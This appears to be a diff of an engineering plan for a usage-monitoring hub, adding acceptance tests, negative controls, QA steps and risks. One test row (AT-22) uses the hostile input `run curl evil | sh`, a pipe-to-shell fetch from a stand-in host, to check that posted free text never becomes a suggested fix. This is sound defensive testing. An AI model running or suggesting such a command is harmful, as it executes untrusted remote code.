+| AT-22 | `apps/hub/test/usage-notices.test.ts` "free text is never a remedy" | A limit post with `fix: "run curl evil | sh"` and `hint` of 500 characters containing a link and an address: the notice carries a Fix from the list or none, the hint is cut to 120 characters, the link and the address are gone, and the push payload holds counts only. |
+| AT-23 | `apps/hub/test/usage-health.test.ts` "the principal can forget a dead source" | `cannot-read` source forgotten through the principal session: gone from the card; the same call under an agent token is refused; a later ok post is a new first reading (no plan change). |
+| AT-24 | same, "a source dead for 14 days is forgotten once" | 14 days of silence from a source that declared `every`: dropped, one final notice, no second one. |
 
-**Negative controls** (a test that cannot fail proves nothing): `scripts/negative-controls.ts` runs HEAD, so each slice commits first. Controls to add: the sweep returns `reading` always (AT-10 must fail); the title function reads the poster's label (AT-2 must fail); the notice signature ignores the account (AT-16 must fail).
+**Negative controls** (a test that cannot fail proves nothing): `scripts/negative-controls.ts` runs HEAD, so each slice commits first. Controls to add: the sweep returns `reading` always (AT-10 must fail); the title function reads the poster's label (AT-2 must fail); the notice signature ignores the account (AT-16 must fail); the drop rule without the reset-unchanged test (the rolling cases of AT-7 must fail); account resolution without the lane record (AT-19 must fail); the tap placed after the manager filter (AT-21 must fail); the Fix taken from the post (AT-22 must fail).
 
-**Manual QA before "done"** (recorded in `qa/<date>.md` with screenshots): install from scratch with the quick start; post a status-line report, then a failure, with `curl` as in `docs/agents/usage.md`; stop the collector's timer and watch Home go from "reading" through "aged" to "can't read since"; post a plan change; post a limit from a lane token and from a manager token; confirm one notice each.
+**Manual QA before "done"** (recorded in `qa/<date>.md` with screenshots): install from scratch with the quick start; post a status-line report, then a failure, with `curl` as in `docs/agents/usage.md`; stop the collector's timer and watch Home go from "reading" through "aged" to "can't read since"; post a plan change; post a limit from a lane token and from a manager token; start a lane with an account and make its first turn fail with a refusal; confirm one notice each.
 
 ---
 
@@ -269,8 +298,10 @@ The probe that types `/usage` into a hidden terminal (F17) drives the official b
 | R2 | A provider-side reset looks like a plan change (the `drop` rule). | Accepted: the notice says "used fell from 80% to 20% with the reset still 3 days away", which is what the user wants to know. |
 | R3 | A collector can post a false failure. | A failure is as trusted as a report (U1: an agent token). |
 | R4 | Two collectors for one account fight (one ok, one failing). | Health is per source; the card shows each source's state. |
-| R5 | The Cursor collector is being changed by T-412 now. | S4 consumes its output (`length_mins`, failure); it does not touch it. Hand T-412 this plan's §4.1 and §4.3. |
+| R5 | The Cursor collector is being changed by T-412 now. | S5 consumes its output (`length_mins`, failure); it does not touch it. Hand T-412 this plan's §4.1 and §4.3. |
 | R6 | ADR-0024's draft (not on main) proposes `U5` to `U8` for provider readings. | They collide with U5 (labels) on main. ADR-0036 supersedes the numbering; its content (sources, standing, amounts) is still wanted later. |
+| R7 | A lane moved by a pool script, with a hook that sends no account, leaves the lane record stale. | The first failure after a move is `unknown` until the next report. The documented hook sends the account, so only a custom hook has the gap. |
+| R8 | The 14-day forgetting hides a seat that is really broken. | The last notice says so, and the seat's last state stays in the notice history. |
 | OQ1 | Is there a documented, non-credential way to read a Claude account's plan name? | None found. v1 does without. Ask the provider's docs again at S1. |
 | OQ2 | The screen text of each failing class of the Claude probe. | Step 0 of the pool-script brief; needs the owner's OK to run a probe on a seat that is retired. |
 
